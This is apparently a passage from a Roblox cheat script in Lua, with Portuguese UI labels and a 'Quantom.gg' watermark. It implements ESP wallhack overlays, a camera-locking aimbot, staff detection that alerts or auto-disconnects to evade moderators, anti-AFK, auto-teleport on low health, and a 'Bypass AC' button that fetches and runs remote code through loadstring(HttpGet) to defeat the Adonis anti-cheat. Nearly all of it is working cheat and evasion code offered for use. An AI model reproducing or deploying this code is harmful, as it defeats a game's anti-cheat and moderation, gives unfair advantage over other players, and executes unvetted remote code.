Players.PlayerAdded:Connect(SetupPlayer)
Players.PlayerRemoving:Connect(ClearPlayer)

RunService.RenderStepped:Connect(function()
    for player, esp in pairs(Objects) do
        pcall(function()
            local char = player.Character
            local hum = char and char:FindFirstChildOfClass("Humanoid")
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            
            if not char or not hum or not hrp or hum.Health <= 0 then
                HideAll(esp)
                return
            end
            
            local localChar = LocalPlayer.Character
            local localHRP = localChar and localChar:FindFirstChild("HumanoidRootPart")
            
            if not localHRP then
                HideAll(esp)
                return
            end
            
            if ESP.InvisibleCheck and IsInvisible(player) then
                HideAll(esp)
                return
            end
            
            local distance = (hrp.Position - localHRP.Position).Magnitude
            if distance > MaxDistance then
                HideAll(esp)
                return
            end
            
            local pos, onScreen = Camera:WorldToViewportPoint(hrp.Position)
            if not onScreen or pos.Z <= 0 then
                HideAll(esp)
                return
            end
            
            local h = math.clamp(3000 / pos.Z, 20, 300)
            local w = h / 1.5
            local color = TeamColor(player)
            
            if ESP.Box then
                esp.Box.Size = Vector2.new(w,h)
                esp.Box.Position = Vector2.new(pos.X-w/2,pos.Y-h/2)
                esp.Box.Color = color
                esp.Box.Visible = true
            else
                esp.Box.Visible = false
            end
            
            if ESP.Name then
                esp.Name.Text = player.Name
                esp.Name.Position = Vector2.new(pos.X,pos.Y-h/2-12)
                esp.Name.Color = color
                esp.Name.Visible = true
            else
                esp.Name.Visible = false
            end
            
            if ESP.Health then
                esp.Health.Text = math.floor(hum.Health)
                esp.Health.Position = Vector2.new(pos.X+w/2+4,pos.Y)
                esp.Health.Color = Color3.fromRGB(0,255,0)
                esp.Health.Visible = true
            else
                esp.Health.Visible = false
            end
            
            if ESP.Team and player.Team then
                esp.Team.Text = player.Team.Name
                esp.Team.Position = Vector2.new(pos.X+w/2+4,pos.Y-12)
                esp.Team.Color = color
                esp.Team.Visible = true
            else
                esp.Team.Visible = false
            end
            
            if ESP.Items then
                esp.Items.Text = GetItems(player)
                esp.Items.Position = Vector2.new(pos.X-w/2-4,pos.Y)
                esp.Items.Color = Color3.fromRGB(255,255,255)
                esp.Items.Visible = true
            else
                esp.Items.Visible = false
            end
            
            if ESP.Skeleton then
                local parts = GetParts(char)
                local function DrawLine(line, fromPart, toPart)
                    if fromPart and toPart then
                        local p1, v1 = Camera:WorldToViewportPoint(fromPart.Position)
                        local p2, v2 = Camera:WorldToViewportPoint(toPart.Position)
                        if v1 and v2 and p1.Z > 0 and p2.Z > 0 then
                            line.From = Vector2.new(p1.X,p1.Y)
                            line.To = Vector2.new(p2.X,p2.Y)
                            line.Color = color
                            line.Visible = true
                            return
                        end
                    end
                    line.Visible = false
                end
                DrawLine(esp.Skeleton.Head, parts.Head, parts.UpperTorso)
                DrawLine(esp.Skeleton.LA, parts.UpperTorso, parts.LeftArm)
                DrawLine(esp.Skeleton.RA, parts.UpperTorso, parts.RightArm)
                DrawLine(esp.Skeleton.LL, parts.UpperTorso, parts.LeftLeg)
                DrawLine(esp.Skeleton.RL, parts.UpperTorso, parts.RightLeg)
            else
                for _, l in pairs(esp.Skeleton) do l.Visible = false end
            end
            
            if ESP.Staff and IsStaff(player) then
                esp.StaffText.Text = "STAFF"
                esp.StaffText.Position = Vector2.new(pos.X,pos.Y-h/2-24)
                esp.StaffText.Color = Color3.fromRGB(255,0,0)
                esp.StaffText.Visible = true
            else
                esp.StaffText.Visible = false
            end
        end)
    end
end)

local Slider = Esp:Slider({
    Title = "Dist√¢ncia ESP",
    Desc = "",
    Step = 1,
    Value = {Min = 1, Max = 2000, Default = MaxDistance},
    Callback = function(value)
        SetMaxDistance(value)
    end
})

Esp:Toggle({ Title="ESP Box", Value=false, Callback=function(v) ESP.Box=v end })
Esp:Toggle({ Title="ESP Nick", Value=false, Callback=function(v) ESP.Name=v end })
Esp:Toggle({ Title="ESP Vida", Value=false, Callback=function(v) ESP.Health=v end })
Esp:Toggle({ Title="ESP Skeleton", Value=false, Callback=function(v) ESP.Skeleton=v end })
Esp:Toggle({ Title="ESP Itens", Value=false, Callback=function(v) ESP.Items=v end })
Esp:Toggle({ Title="ESP Team", Value=false, Callback=function(v) ESP.Team=v end })
Esp:Toggle({ Title="ESP Staff", Value=false, Callback=function(v) ESP.Staff=v end })
Esp:Toggle({ Title="ESP Invisible Check", Value=true, Callback=function(v) ESP.InvisibleCheck=v end })

--watermark


local WatermarkEnabled = false

local Toggle = Misc:Toggle({
    Title = "WaterMark",
    Desc = "",
    Icon = "",
    Value = false,
    Callback = function(state)
        WatermarkEnabled = state
        if not state then

            local player = game:GetService("Players").LocalPlayer
            pcall(function()
                player.PlayerGui:FindFirstChild("QuantomWatermark"):Destroy()
            end)
        else

            local Players = game:GetService("Players")
            local RunService = game:GetService("RunService")
            local UserInputService = game:GetService("UserInputService")
            local player = Players.LocalPlayer

            local ScreenGui = Instance.new("ScreenGui")
            ScreenGui.Name = "QuantomWatermark"
            ScreenGui.ResetOnSpawn = false
            ScreenGui.Parent = player.PlayerGui

            local Frame = Instance.new("Frame")
            Frame.Size = UDim2.new(0, 220, 0, 28)
            Frame.Position = UDim2.new(0, 15, 0, 15)
            Frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
            Frame.BackgroundTransparency = 0.15
            Frame.BorderSizePixel = 0
            Frame.Parent = ScreenGui

            local UICorner = Instance.new("UICorner")
            UICorner.CornerRadius = UDim.new(0, 8)
            UICorner.Parent = Frame

            local UIStroke = Instance.new("UIStroke")
            UIStroke.Color = Color3.fromRGB(90, 90, 90)
            UIStroke.Thickness = 1
            UIStroke.Transparency = 0.4
            UIStroke.Parent = Frame

            local TextLabel = Instance.new("TextLabel")
            TextLabel.Size = UDim2.new(1, -10, 1, 0)
            TextLabel.Position = UDim2.new(0, 5, 0, 0)
            TextLabel.BackgroundTransparency = 1
            TextLabel.Text = "Quantom.gg | FPS: 0 | Ping: 0ms"
            TextLabel.TextColor3 = Color3.fromRGB(230, 230, 230)
            TextLabel.TextSize = 13
            TextLabel.Font = Enum.Font.GothamMedium
            TextLabel.TextXAlignment = Enum.TextXAlignment.Left
            TextLabel.Parent = Frame

            local fps = 0
            local frames = 0
            local lastTime = tick()

            RunService.RenderStepped:Connect(function()
                if not WatermarkEnabled then return end
                frames += 1
                if tick() - lastTime >= 1 then
                    fps = frames
                    frames = 0
                    lastTime = tick()
                    local ping = math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue())
                    TextLabel.Text = "Quantom.gg | FPS: " .. fps .. " | Ping: " .. ping .. "ms"
                end
            end)


            local dragging = false
            local dragStart
            local startPos

            Frame.InputBegan:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 then
                    dragging = true
                    dragStart = input.Position
                    startPos = Frame.Position
                end
            end)

            Frame.InputEnded:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 then
                    dragging = false
                end
            end)

            UserInputService.InputChanged:Connect(function(input)
                if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
                    local delta = input.Position - dragStart
                    Frame.Position = UDim2.new(
                        startPos.X.Scale,
                        startPos.X.Offset + delta.X,
                        startPos.Y.Scale,
                        startPos.Y.Offset + delta.Y
                    )
                end
            end)
        end
    end
})


--ant afk

local Button = Misc:Button({
    Title = "Ant AFK",
    Desc = "",
    Locked = false,
    Callback = function()

        repeat task.wait() until game:IsLoaded() and game.Players.LocalPlayer and game.Players.LocalPlayer.Character

        if getgenv().AntiAFKActive then
            getgenv().AntiAFKActive = false
            task.wait(0.3)
        end

        getgenv().AntiAFKActive = true

        local Players = game:GetService("Players")
        local VirtualUser = game:GetService("VirtualUser")
        local LocalPlayer = Players.LocalPlayer

        LocalPlayer.Idled:Connect(function()
            if getgenv().AntiAFKActive then
                VirtualUser:CaptureController()
                VirtualUser:ClickButton2(Vector2.new())
            end
        end)

        WindUI:Notify({
            Title = "Ant Afk",
            Content = "Ativado",
            Duration = 5,
            Icon = "bird",
        })

    end
})


--Staff detection

local Players = game:GetService("Players")
local SoundService = game:GetService("SoundService")
local groupId = 35641771
local minRank = 5

local monitorando = false
local somAlerta = nil

local function criarSom()
    if not somAlerta then
        somAlerta = Instance.new("Sound")
        somAlerta.SoundId = "rbxassetid://6026984224"
        somAlerta.Volume = 5
        somAlerta.Looped = true
        somAlerta.Parent = game:GetService("SoundService")
    end
end

local function temStaff()
    for _, player in ipairs(Players:GetPlayers()) do
        local success, rank = pcall(function()
            return player:GetRankInGroup(groupId)
        end)
        if success and rank >= minRank then
            return true
        end
    end
    return false
end

local function iniciarMonitoramento()
    task.spawn(function()
        while monitorando do
            if temStaff() then
                WindUI:Notify({
                    Title = "Staff detectado!",
                    Content = "Tem staff no servidor que voc√™ est√°!",
                    Duration = 3,
                    Icon = "mail-warning",
                })
                
                criarSom()
                if somAlerta and not somAlerta.IsPlaying then
                    somAlerta:Play()
                end
            else
                if somAlerta and somAlerta.IsPlaying then
                    somAlerta:Stop()
                end
            end
            task.wait(5)
        end
        
        if somAlerta and somAlerta.IsPlaying then
            somAlerta:Stop()
        end
    end)
end

Misc:Toggle({
    Title = "Staff detection",
    Desc = "",
    Icon = "bird",
    Type = "Checkbox",
    Value = false,
    Callback = function(state)
        monitorando = state
        if state then
            iniciarMonitoramento()
        else
            if somAlerta and somAlerta.IsPlaying then
                somAlerta:Stop()
            end
        end
    end
})


--ant staff kick

local Players = game:GetService("Players")
local groupId = 35641771
local minRank = 5

local monitorando = false

local function temStaff()
    for _, player in ipairs(Players:GetPlayers()) do
        local success, rank = pcall(function()
            return player:GetRankInGroup(groupId)
        end)
        if success and rank >= minRank then
            return true
        end
    end
    return false
end

local function iniciarMonitoramento()
    task.spawn(function()
        while monitorando do
            if temStaff() then
                Players.LocalPlayer:Kick("Staff no jogo amigao kkkkkkkk")
                break
            end
            task.wait(5)
        end
    end)
end

Misc:Toggle({
    Title = "Staff detection (Auto Kick)",
    Desc = "",
    Icon = "bird",
    Type = "Checkbox",
    Value = false,
    Callback = function(state)
        monitorando = state
        if state then
            iniciarMonitoramento()
        end
    end
})

--aimbot pc

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local Camera = workspace.CurrentCamera
local LocalPlayer = Players.LocalPlayer

getgenv().Aimbot = {}
local Environment = getgenv().Aimbot

Environment.Settings = {
    Enabled = false,
    TeamCheck = false,
    AliveCheck = true,
    WallCheck = false,
    Sensitivity = 0,
    Toggle = false,
    LockPart = "Head"
}

Environment.FOVSettings = {
    Enabled = true,
    Visible = true,
    Amount = 90,
    Color = Color3.fromRGB(255,255,255),
    LockedColor = Color3.fromRGB(255,70,70),
    Transparency = 0.5,
    Sides = 60,
    Thickness = 1,
    Filled = false
}

Environment.FOVCircle = Drawing.new("Circle")

local Running = false
local Typing = false
local Animation = nil
local ServiceConnections = {}

local function CancelLock()
    Environment.Locked = nil
    if Animation then
        Animation:Cancel()
        Animation = nil
    end
    Environment.FOVCircle.Color = Environment.FOVSettings.Color
end

local function GetClosestPlayer()
    local RequiredDistance = Environment.FOVSettings.Enabled and Environment.FOVSettings.Amount or 2000
    local MousePos = UserInputService:GetMouseLocation()

    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            local char = player.Character
            local hum = char and char:FindFirstChildOfClass("Humanoid")
            local part = char and char:FindFirstChild(Environment.Settings.LockPart)

            if char and hum and part then
                if Environment.Settings.TeamCheck and player.Team == LocalPlayer.Team then continue end
                if Environment.Settings.AliveCheck and hum.Health <= 0 then continue end
                if Environment.Settings.WallCheck then
                    if #Camera:GetPartsObscuringTarget({part.Position}, char:GetDescendants()) > 0 then
                        continue
                    end
                end

                local pos, onScreen = Camera:WorldToViewportPoint(part.Position)
                if onScreen then
                    local dist = (Vector2.new(MousePos.X, MousePos.Y) - Vector2.new(pos.X, pos.Y)).Magnitude
                    if dist < RequiredDistance then
                        RequiredDistance = dist
                        Environment.Locked = player
                    end
                end
            end
        end
    end
end

ServiceConnections.TypingStarted = UserInputService.TextBoxFocused:Connect(function()
    Typing = true
end)

ServiceConnections.TypingEnded = UserInputService.TextBoxFocusReleased:Connect(function()
    Typing = false
end)

ServiceConnections.Render = RunService.RenderStepped:Connect(function()
    if Environment.FOVSettings.Enabled and Environment.Settings.Enabled then
        Environment.FOVCircle.Visible = Environment.FOVSettings.Visible
        Environment.FOVCircle.Radius = Environment.FOVSettings.Amount
        Environment.FOVCircle.NumSides = Environment.FOVSettings.Sides
        Environment.FOVCircle.Thickness = Environment.FOVSettings.Thickness
        Environment.FOVCircle.Transparency = Environment.FOVSettings.Transparency
        Environment.FOVCircle.Color = Environment.FOVSettings.Color
        Environment.FOVCircle.Position = UserInputService:GetMouseLocation()
    else
        Environment.FOVCircle.Visible = false
    end

    if Running and Environment.Settings.Enabled then
        GetClosestPlayer()

        if Environment.Locked then
            local part = Environment.Locked.Character and Environment.Locked.Character:FindFirstChild(Environment.Settings.LockPart)
            if part then
                if Environment.Settings.Sensitivity > 0 then
                    Animation = TweenService:Create(
                        Camera,
                        TweenInfo.new(Environment.Settings.Sensitivity, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),
                        {CFrame = CFrame.new(Camera.CFrame.Position, part.Position)}
                    )
                    Animation:Play()
                else
                    Camera.CFrame = CFrame.new(Camera.CFrame.Position, part.Position)
                end
                Environment.FOVCircle.Color = Environment.FOVSettings.LockedColor
            end
        end
    end
end)

ServiceConnections.InputBegan = UserInputService.InputBegan:Connect(function(input)
    if Typing then return end
    if input.UserInputType == Enum.UserInputType.MouseButton2 then
        if Environment.Settings.Toggle then
            Running = not Running
            if not Running then CancelLock() end
        else
            Running = true
        end
    end
end)

ServiceConnections.InputEnded = UserInputService.InputEnded:Connect(function(input)
    if Typing then return end
    if not Environment.Settings.Toggle then
        if input.UserInputType == Enum.UserInputType.MouseButton2 then
            Running = false
            CancelLock()
        end
    end
end)


AimVisuals:Toggle({
    Title = "Aimbot",
    Desc = "",
    Icon = "crosshairs",
    Type = "Checkbox",
    Value = false,
    Callback = function(v)
        Environment.Settings.Enabled = v
        if not v then
            Running = false
            CancelLock()
        end
    end
})

AimVisuals:Toggle({
    Title = "Team Check",
    Desc = "",
    Icon = "users",
    Type = "Checkbox",
    Value = false,
    Callback = function(v)
        Environment.Settings.TeamCheck = v
    end
})

AimVisuals:Toggle({
    Title = "Visible Check",
    Desc = "",
    Icon = "eye",
    Type = "Checkbox",
    Value = true,
    Callback = function(v)
        Environment.Settings.AliveCheck = v
    end
})

AimVisuals:Toggle({
    Title = "Wall Check",
    Desc = "",
    Icon = "wall",
    Type = "Checkbox",
    Value = false,
    Callback = function(v)
        Environment.Settings.WallCheck = v
    end
})

AimVisuals:Slider({
    Title = "Sensitivity",
    Desc = "",
    Step = 0.05,
    Value = {Min = 0, Max = 1, Default = 0},
    Callback = function(v)
        Environment.Settings.Sensitivity = tonumber(v)
    end
})

AimVisuals:Slider({
    Title = "FOV Size",
    Desc = "",
    Step = 1,
    Value = {Min = 20, Max = 500, Default = 90},
    Callback = function(v)
        Environment.FOVSettings.Amount = tonumber(v)
    end
})

AimVisuals:Dropdown({
    Title = "Lock Part",
    Desc = "",
    Values = { "Head", "HumanoidRootPart", "UpperTorso" },
    Value = "Head",
    Multi = false,
    AllowNone = false,
    Callback = function(v)
        Environment.Settings.LockPart = v
    end
})

--auto cl

local Players = game:GetService("Players")
local player = Players.LocalPlayer

local vidaMinima = 20
local destino = CFrame.new(-270, 176, -3461)
local AutoTP = true

local function onCharacterAdded(character)
    local humanoid = character:WaitForChild("Humanoid")
    local rootPart = character:WaitForChild("HumanoidRootPart")

    humanoid.HealthChanged:Connect(function(health)
        if AutoTP and health <= vidaMinima then
            rootPart.CFrame = destino
        end
    end)
end

player.CharacterAdded:Connect(onCharacterAdded)

if player.Character then
    onCharacterAdded(player.Character)
end

PlayerTab:Toggle({
    Title = "Auto Teleport",
    Desc = "",
    Icon = "bird",
    Type = "Checkbox",
    Value = true,
    Callback = function(state)
        AutoTP = state
    end
})

PlayerTab:Slider({
    Title = "Vida M√≠nima",
    Desc = "",
    Step = 1,
    Value = {Min = 1, Max = 100, Default = vidaMinima},
    Callback = function(value)
        vidaMinima = value
    end
})

--Adonis bypass 
local Button = Misc:Button({
    Title = "Bypass AC",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/refs/heads/main/Source.lua"))()
    end
})

